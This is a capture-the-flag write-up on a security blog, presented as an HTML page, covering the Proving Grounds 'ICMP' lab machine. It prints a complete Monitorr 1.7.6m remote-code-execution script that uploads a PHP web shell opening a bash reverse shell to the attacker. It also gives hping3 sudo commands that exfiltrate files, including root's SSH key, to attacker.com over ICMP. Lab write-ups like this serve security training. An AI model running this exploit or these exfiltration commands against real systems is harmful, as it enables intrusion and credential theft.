@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: ICMP</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: ICMP | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: ICMP" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/07/15/Proving_grounds_Play-ICMP.html" />
+<meta property="og:url" content="http://localhost:4000/2023/07/15/Proving_grounds_Play-ICMP.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-15T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: ICMP" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-07-15T12:00:00+05:30","datePublished":"2023-07-15T12:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: ICMP","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/15/Proving_grounds_Play-ICMP.html"},"url":"http://localhost:4000/2023/07/15/Proving_grounds_Play-ICMP.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/07/15/Proving_grounds_Play-ICMP.html">
+    <h2 class="post-title">Proving grounds Play: ICMP</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Jul 15, 2023</div></div>
+  <div class="post">
+    <h2 id="walkthrough-on-youtube">Walkthrough on Youtube</h2>
+
+<p><a href="https://youtu.be/6fyL_fFyV4c"><img src="/assets/images/CTF/Proving_Grounds/ICMP/youtube.png" alt="youtube" /></a></p>
+
+<h2 id="nmap">NMAP</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/nmap.png" alt="img" /></p>
+
+<h2 id="port-80-tech-stack">PORT 80 Tech Stack</h2>
+
+<ul>
+  <li>Operating System: Debian</li>
+  <li>Web Technology: Apache, PHP (view-page-source)</li>
+</ul>
+
+<h2 id="monitorr">Monitorr</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/monitorr%20version.png" alt="img" /></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/searchsploit_search.png" alt="img" /></p>
+
+<h3 id="exploit-code">Exploit Code</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+</span>
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="k">if</span> <span class="nf">len </span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">specify params in format: python </span><span class="sh">"</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> target_url lhost lport</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/assets/php/upload.php</span><span class="sh">"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/plain, */*; q=0.01</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">X-Requested-With</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XMLHttpRequest</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">multipart/form-data; boundary=---------------------------31046105003900160576454225745</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">close</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">fileToUpload</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">she_ll.php</span><span class="se">\"\r\n</span><span class="s">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\"</span><span class="s">/bin/bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/</span><span class="sh">"</span><span class="o">+</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> 0&gt;&amp;1</span><span class="sh">'</span><span class="se">\"</span><span class="s">);</span><span class="se">\r\n\r\n</span><span class="s">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="sh">"</span>
+
+    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">A shell script should be uploaded. Now we try to execute it</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/assets/data/usrimg/she_ll.php</span><span class="sh">"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">close</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="obtaining-reverse-shell">Obtaining Reverse Shell</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/rce1.png" alt="img" /></p>
+
+<p><strong>Obtained local flag</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/local_flag.png" alt="img" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h3 id="obtain-user">Obtain user</h3>
+
+<p>The permission is denied to access the <code class="language-plaintext highlighter-rouge">devel</code> folder as current user is not a system user. But as the tip found in the reminder file below.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/reminder.png" alt="img" /></p>
+
+<p>The php file <code class="language-plaintext highlighter-rouge">crypt.php</code> inside the <code class="language-plaintext highlighter-rouge">devel</code> folder disclosed the SSH password for the user <code class="language-plaintext highlighter-rouge">fox</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">crypt</span><span class="p">(</span><span class="s1">'BUHNIJMONIBUVCYTTYVGBUHJNI'</span><span class="p">,</span><span class="s1">'da'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><strong>User access obtained.</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/user.png" alt="img" /></p>
+
+<h2 id="root-privilege-escalation">Root Privilege Escalation</h2>
+
+<p>Check the current user sudo permissions.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/sudo-l.png" alt="img" /></p>
+
+<p>Search for exploit in GTFO bins for <code class="language-plaintext highlighter-rouge">hping3</code></p>
+
+<h3 id="sudo">Sudo</h3>
+
+<p>If the binary is allowed to run as superuser by <code class="language-plaintext highlighter-rouge">sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hping3
+/bin/sh
+</code></pre></div></div>
+
+<p>The file is continuously sent, adjust the <code class="language-plaintext highlighter-rouge">--count</code> parameter or kill the sender when done. Receive on the attacker box with:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hping3 <span class="nt">--icmp</span> <span class="nt">--listen</span> xxx <span class="nt">--dump</span>
+</code></pre></div></div>
+
+<p>RHOST=attacker.com
+LFILE=file_to_read</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hping3 <span class="s2">"</span><span class="nv">$RHOST</span><span class="s2">"</span> <span class="nt">--icmp</span> <span class="nt">--data</span> 500 <span class="nt">--sign</span> xxx <span class="nt">--file</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<h2 id="transfering-ssh-key-locally-to-obtain-root-access-through-hping3">Transfering SSH key locally to obtain root access through hping3</h2>
+
+<h3 id="icmp-listener">ICMP Listener</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/icmp-listener.png" alt="img" /></p>
+
+<h3 id="icmp-data-send">ICMP: Data send</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/icmp_key_send.png" alt="img" /></p>
+
+<h3 id="icmp-data-receive">ICMP: Data Receive</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/icmp_root_ssh_key.png" alt="img" /></p>
+
+<h2 id="ssh-root-user">SSH Root User</h2>
+
+<p>SSH to the root user using the obtained root SSH key.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/root.png" alt="img" /></p>
+
+<p><strong>Root user access and proof.txt obtained</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/ICMP/proof.png" alt="img" /></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
